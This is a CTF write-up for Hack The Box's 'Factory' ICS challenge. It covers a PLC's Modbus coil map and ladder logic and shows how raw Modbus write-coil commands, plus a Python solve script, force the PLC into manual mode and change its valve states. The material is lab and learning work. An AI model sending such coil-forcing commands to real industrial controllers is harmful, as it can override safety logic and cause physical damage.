---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "easy"
status: Documents
date_started: 2026-02-03
date_completed: 2026-02-03
tags:
  - htb
  - challenge
  - ics
  - scada
  - modbus
  - plc
  - ladder_logic
---

# Factory

## Overview

**Category:** hardware
**Difficulty:** easy
**Platform:** Hack The Box
**Date:** 2026-02-03

> [!note] Challenge Scenario
>
> > Our infrastructure is under attack! The HMI interface went offline and we lost control of some critical PLCs in our ICS system. Moments after the attack started we managed to identify the target but did not have time to respond. The water storage facility's high/low sensors are corrupted thus setting the PLC into a halt state. We need to regain control and empty the water tank before it overflows. Our field operative has set a remote connection directly with the serial network of the system.

## Files

- `interface_setup.png` — Network diagram showing the ICS architecture
- `PLC_Ladder_Logic.pdf` — PLC ladder logic diagram for the water_storage_facility

## Enumeration

### Architecture

```
[Laptop-1 (Us)] --TCP--> [Laptop-2 (Gateway)] --Modbus RTU (Serial)--> [PLC-1 (Slave 82)]
```

- **PLC-1** (Target): Slave Address 82 (0x52), connected via serial Modbus RTU
- **Laptop-2**: Gateway — converts received Modbus packets into valid packets (with CRC) and forwards into the real Modbus RTU network
- **Laptop-1** (Us/Host): Sends Modbus commands to Laptop-2 via TCP, which forwards them to the PLC

### PLC-1 Coil Addresses

| Address (decimal) | Hex    | Coil               |
| ----------------- | ------ | ------------------ |
| 5                 | 0x0005 | cutoff             |
| 12                | 0x000C | in_valve           |
| 21                | 0x0015 | out_valve          |
| 26                | 0x001A | cutoff_in          |
| 33                | 0x0021 | start              |
| 52                | 0x0034 | force_start_out    |
| 1336              | 0x0538 | force_start_in     |
| 9947              | 0x26DB | manual_mode_control |

## Vulnerability

### Ladder Logic

The PLC operates in two modes: **auto_mode** and **manual_mode**.

**Auto Mode (current — broken):**
- `in_valve` and `out_valve` are controlled by `high_sensor` and `low_sensor`
- Sensors are corrupted (both = 0) → PLC in halt state
- `in_valve` = OPEN (water flowing in), `out_valve` = CLOSED (water not draining)
- Tank is overflowing!

**Manual Mode (need to switch to):**
- `start` AND `manual_mode_control` AND NOT `auto_mode` → switches to manual_mode
- `force_start_out` AND `manual_mode` → opens `out_valve` (drain)
- `cutoff_in` AND `manual_mode` → activates `stop_in` → closes `in_valve` (stops inflow)

**Strategy:** Switch to manual_mode, close in_valve, open out_valve.

## Exploitation

### Interface

TCP connection provides a text menu:
```
Water Storage Facility Interface
1. Get status of system
2. Send modbus command
3. Exit
Select:
```

Option 2 accepts **hex-encoded Modbus RTU** commands (without CRC — gateway adds it automatically).

### Step 1: Check Initial State (Option 1)

```json
{"auto_mode": 1, "manual_mode": 0, "stop_out": 0, "stop_in": 0,
 "low_sensor": 0, "high_sesnor": 0, "in_valve": 1, "out_valve": 0, "flag": "HTB{}"}
```

Confirmed: auto_mode, sensors = 0, in_valve OPEN, out_valve CLOSED, flag empty.

### Step 2: Send Modbus Commands (Option 2)

Modbus RTU Write Single Coil (FC 0x05) format:
```
{slave_id:02x}{function_code:02x}{address:04x}{value:04x}
```
- slave_id = 82 = 0x52
- function_code = 0x05 (Write Single Coil)
- value: FF00 = ON, 0000 = OFF

**Command 1: manual_mode_control ON (addr 9947 = 0x26DB)**
```
520526dbff00
```

**Command 2: start ON (addr 33 = 0x0021)**
```
52050021ff00
```
→ Ladder logic: `start AND manual_mode_control AND NOT auto_mode` → switches to manual_mode.

**Command 3: cutoff_in ON (addr 26 = 0x001A)**
```
5205001aff00
```
→ `cutoff_in AND manual_mode` → `stop_in` ON → `in_valve` CLOSED.

**Command 4: force_start_out ON (addr 52 = 0x0034)**
```
52050034ff00
```
→ `force_start_out AND manual_mode` → `out_valve` OPEN (draining tank).

### Step 3: Verify Result (Option 1)

```json
{"auto_mode": 0, "manual_mode": 1, "stop_out": 0, "stop_in": 1,
 "low_sensor": 0, "high_sesnor": 0, "in_valve": 0, "out_valve": 1,
 "flag": "HTB{REDACTED}"}
```

✅ manual_mode: 1, stop_in: 1, in_valve: 0 (closed), out_valve: 1 (open, draining)

### Solve Script

```python
#!/usr/bin/env python3
"""
Factory — HackTheBox Hardware/ICS Challenge
Switch PLC from auto_mode to manual_mode, close in_valve, open out_valve.
"""
import socket
import struct

HOST = '$RHOST'
PORT = $RPORT
SLAVE = 82  # 0x52

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((HOST, PORT))

def rx(sock, t=1):
    """Receive all available data."""
    sock.settimeout(t)
    d = b''
    try:
        while True:
            c = sock.recv(4096)
            if not c:
                break
            d += c
    except:
        pass
    return d.decode(errors='replace')

def write_coil(slave, addr, on=True):
    """Build Modbus RTU Write Single Coil (FC 0x05) hex command."""
    val = 0xFF00 if on else 0x0000
    return struct.pack('>BBHH', slave, 0x05, addr, val).hex()

def send_modbus(s, cmd_hex):
    """Send a Modbus command via the text menu (option 2)."""
    s.send(b'2\n')
    rx(s)
    s.send(cmd_hex.encode() + b'\n')
    return rx(s)

# Read banner
rx(s)

# Step 1: Switch to manual mode
send_modbus(s, write_coil(SLAVE, 9947, True))   # manual_mode_control ON
send_modbus(s, write_coil(SLAVE, 33, True))      # start ON
# Now: auto_mode=0, manual_mode=1

# Step 2: Close in_valve (stop water inflow)
send_modbus(s, write_coil(SLAVE, 26, True))      # cutoff_in ON → stop_in → in_valve OFF

# Step 3: Open out_valve (drain the tank)
send_modbus(s, write_coil(SLAVE, 52, True))      # force_start_out ON → out_valve ON

# Step 4: Get flag
s.send(b'1\n')
print(rx(s))

s.close()
```

> [!info] Tools Used
>
> - `python3`
> - `socket`

## Notes

- Modbus RTU Write Single Coil: `{slave}{0x05}{addr_hi}{addr_lo}{FF}{00}` for ON
- Gateway adds CRC automatically — send without CRC
- Command order matters: first `manual_mode_control`, then `start` (ladder logic requires both for switching)
- Slave address 82 (decimal) = 0x52 (hex)
- Coil addresses are given in decimal, need to convert to hex for Modbus frame

## Flag

`HTB{...}`